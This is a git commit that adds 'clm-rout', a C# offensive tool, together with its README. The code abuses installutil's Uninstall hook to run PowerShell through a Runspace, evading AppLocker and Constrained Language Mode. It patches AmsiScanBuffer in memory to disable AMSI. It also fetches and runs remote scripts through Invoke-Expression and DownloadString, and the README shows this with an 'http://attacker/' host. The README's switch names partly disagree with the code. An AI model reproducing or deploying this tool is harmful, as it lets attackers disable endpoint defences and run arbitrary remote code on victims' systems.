6019be5b34a4889ee13fb63931de7241e613c656
Alexandre Teyar <11601622+aress31@users.noreply.github.com>
2022-07-31 14:18:37 +0100

    init

---
+++ CLMRout/Program.cs
@@ -0,0 +1,116 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
+
+namespace CLMRout
+{
+    class Program
+    {
+        static void Main()
+        {
+            Console.WriteLine("Keep walking... nothing to see there...");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static int PatchAMSI()
+        {
+            string procName = string.Join(
+                "", new char[] { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' });
+            string libName = string.Join(
+                "", new char[] { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' });
+
+            IntPtr lpaddress = GetProcAddress(LoadLibrary(libName), procName);
+            UIntPtr dwSize = (UIntPtr)5;
+            byte[] source = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+            VirtualProtect(lpaddress, dwSize, 0x40, out uint lpflOldProtect);
+            Marshal.Copy(source, 0, lpaddress, 6);
+
+            return 0;
+        }
+
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            List<KeyValuePair<string, string>> commands = new List<KeyValuePair<string, string>>();
+
+            foreach (string key in Context.Parameters.Keys)
+            {
+                if ((new[] { "cmd", "url" }).Contains(key))
+                {
+                    switch (key)
+                    {
+                        case "cmd":
+                            commands.Add(new KeyValuePair<string, string>(key, Context.Parameters[key]));
+                            break;
+                        case "url":
+                            string[] urls = Context.Parameters[key].Split(';');
+                            urls.ToList().ForEach(
+                                x => commands.Add(
+                                    new KeyValuePair<string, string>(
+                                        key, string.Format("Invoke-Expression (New-Object Net.WebClient).DownloadString(\"{0}\")", x))));
+                            break;
+                        default:
+                            // The default case is not entered for some reasons...
+                            Console.WriteLine("Illegal argument: {0}", key);
+                            break;
+                            // throw new ArgumentException("Illegal argument: {0}", key);
+                    }
+                }
+            }
+
+            if (commands == null || commands.Count == 0)
+            {
+                Console.WriteLine("Required parameters missing. Set /cmd= to run a command or /url= to run a remote script");
+                // throw new ArgumentException("Required parameters missing. Set /cmd= to run a command or /url= to run a remote script");
+            }
+            else
+            {
+                if (Context.Parameters.ContainsKey("patch"))
+                {
+                    Console.WriteLine("[+] Patching AMSI...");
+                    PatchAMSI();
+                }
+
+                commands = commands.OrderByDescending(x => x.Key).ToList();
+
+                string commandLine = string.Join("; ", commands.Select(x => x.Value));
+
+                Console.WriteLine("[+] Running: {0}", commandLine);
+
+                using (Runspace runspace = RunspaceFactory.CreateRunspace())
+                {
+                    runspace.Open();
+
+                    using (PowerShell powershell = PowerShell.Create())
+                    {
+                        powershell.Runspace = runspace;
+                        powershell.AddScript(commandLine);
+
+                        foreach (PSObject obj in powershell.Invoke())
+                        {
+                            Console.WriteLine(obj);
+                        }
+
+                        foreach (ErrorRecord error in powershell.Streams.Error.ReadAll())
+                        {
+                            Console.WriteLine(error);
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,76 @@
 # clm-rout
-A C# program enabling CLM, AppLocker and AMSI bypass through the use of Runspace. 
+
+[![Language](https://img.shields.io/badge/Lang-C%23-blue)](https://docs.microsoft.com/en-gb/powershell/)
+[![License](https://img.shields.io/badge/License-BSD%203-red.svg)](https://docs.microsoft.com/en-us/dotnet/csharp/)
+
+## An all-in-one bypass for `PowerShell Constrained Language Mode` (`CLM`), `AppLocker` and `Antimalware Scan Interface` (`AMSI`) using Runspace.
+
+## Features
+
+- Evade `AppLocker`.
+- Evade `CLM`.
+- Patch `AMSI` via the `/pacth` command switch.
+- Execute command(s) via the `/cmd=<cmd>` command switch.
+- Load and execute remotely hosted script(s) via the `/url=<http(s)://foo.bar/foobar>` command switch.
+- Output the results of commands/scripts (supports `stdout` and `stderr`).
+
+## Installation
+
+1. Clone/download `clm-rout`:
+
+    ```powershell
+    git clone https://github.com/aress31/clm-rout
+    ```
+
+2. Build the project with `Visual Studio 2022`.
+
+## Usage
+
+- (Recommended) Create an "alias" for the function:
+
+```powershell
+function run {
+	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe `
+		/uninstall /logfile= /LogToConsole=false `
+		/patch $Args `
+		C:\users\foo\CLMRout.exe
+}
+```
+
+### Examples
+
+- Execute command(s):
+
+    ```powershell
+    run /cmd="hostname; whoami"
+    ```
+
+- Execute remote script(s):
+
+    ```powershell
+    run /script="http://attacker/script1.ps1; http://attacker/script2.ps1"
+    ```
+
+## Sponsor 💓
+
+If you want to support this project and appreciate the time invested in developping, maintening and extending it; consider donating toward my next (cup of coffee ☕/lamborghini 🚗) - as **a lot** of my **personal time** went into creating this project. 😪
+
+It is easy, all you got to do is press the `Sponsor` button at the top of this page or alternatively [click this link](https://github.com/sponsors/aress31). 😁
+
+## Reporting Issues
+
+Found a bug 🐛? I would love to squash it!
+
+Please report all issues on the GitHub [issues tracker](https://github.com/aress31/clm-rout/issues).
+
+## Contributing
+
+You would like to contribute to better this project? 🤩
+
+Please submit all `PRs` on the GitHub [pull requests tracker](https://github.com/aress31/clm-rout/pulls).
+
+## License
+
+`clm-rout` is distributed under the terms of the `BSD 3`.
+
+See [LICENSE](./LICENSE) for details.
